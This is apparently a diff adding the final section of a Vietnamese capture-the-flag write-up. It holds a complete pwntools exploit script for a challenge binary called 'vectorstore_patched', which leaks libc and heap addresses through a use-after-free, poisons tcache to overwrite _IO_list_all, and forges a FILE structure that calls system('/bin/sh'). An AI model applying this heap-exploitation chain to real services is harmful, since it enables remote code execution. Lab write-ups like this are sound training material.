@@ -565,4 +565,103 @@ Lúc này rdi đang là `sh;`, nó sẽ thực thi `(*(struct _IO_jump_t *) fp->
 
 <img width="1118" height="280" alt="image" src="https://github.com/user-attachments/assets/587dd8f2-60f3-452d-8a9f-c589b0e99d4d" />
 
-Thế là xong, chúng ta đã get shell
+Thế là xong, chúng ta đã get shell quá đơn giản với Nhân Sigma 🐧.
+
+<img width="447" height="447" alt="image" src="https://github.com/user-attachments/assets/ea016134-53f1-4cbc-9099-d26fb6ba5ae6" />
+
+## 3. Exploit
+```Python
+from pwn import *
+
+exe = ELF("vectorstore_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+
+context.binary = exe
+
+p = process('./vectorstore_patched')
+
+def create(idx, size, payload):
+    p.sendlineafter(b'> ', b'UPLOAD')
+    p.sendlineafter(b'ID: ', str(idx).encode())
+    p.sendlineafter(b'Dimensions: ', str(size).encode())
+    p.sendlineafter(b'Name: ', b'Dummy')
+    p.sendlineafter(b'Data format (0=text, 1=binary): ', b'1')
+    p.sendlineafter(b'Byte count: ', str(len(payload)).encode())
+    p.send(payload)
+
+def delete(idx):
+    p.sendlineafter(b'> ', b'DELETE')
+    p.sendlineafter(b'ID: ', str(idx).encode())
+
+create(0, 1, b'AAAA')
+create(1, 300, b'AAAA')
+create(2, 1, b'BBBB')
+delete(1)
+
+p.sendlineafter(b'> ', b'QUERY')
+p.sendlineafter(b'ID: ', b'0')
+p.sendlineafter(b'Offset: ', b'0')
+p.sendlineafter(b'Count: ', b'9')
+p.recvuntil(b'[8]')
+p.recvuntil(b'raw: ')
+
+leak_libc = leak_libc = int(p.recv(18), 16)
+log.success(f'Leak Libc : {hex(leak_libc)}')
+libc.address = leak_libc - 0x21ace0
+log.success(f'Libc base : {hex(libc.address)}')
+
+create(1, 300, b'AAAA')
+create(3, 1, b'CCCC')
+create(4, 10, b'DDDD')
+create(5, 10, b'EEEE')
+create(6, 10, b'FFFF')
+
+delete(6)
+delete(4)
+p.sendlineafter(b'> ', b'QUERY')
+p.sendlineafter(b'ID: ', b'5')
+p.sendlineafter(b'Offset: ', b'0')
+p.sendlineafter(b'Count: ', b'20')
+p.recvuntil(b'[12]')
+p.recvuntil(b'raw: ')
+
+leak_heap = int(p.recv(18), 16)
+heap = leak_heap << 12
+log.success(f'Heap base : {hex(heap)}')
+
+delete(3)
+io_list_all = libc.symbols['_IO_list_all']
+target = io_list_all ^ ( heap >> 12 )
+
+payload = b'A' * 24
+payload += p64(0x31)
+payload += p64(target)
+create(3, 1, payload)
+
+create(4, 10, b'DDDD')
+
+payload = p64(heap + 0x2c0)
+create(6, 10, p64(heap + 0x850))
+
+fake_struct_addr = heap + 0x850
+io_wfile_jumps = libc.sym['_IO_wfile_jumps']
+system = libc.sym['system']
+
+payload = bytearray(b'\x00' * 0x100)
+payload[0:8] = b'  /bin/sh'                                 
+payload[0x18:0x20] = p64(0)                                 
+payload[0x20:0x28] = p64(1)                                 
+payload[0x68:0x70] = p64(system)                            
+payload[0x88:0x90] = p64(fake_struct_addr + 0x50)           
+payload[0xa0:0xa8] = p64(fake_struct_addr)                  
+payload[0xc0:0xc8] = p64(1)                
+payload[0xd8:0xe0] = p64(io_wfile_jumps)                 
+payload[0xe0:0xe8] = p64(fake_struct_addr)
+
+create(7, 300, payload)
+
+p.sendlineafter(b'> ', b'EXIT')
+
+p.interactive()
+```
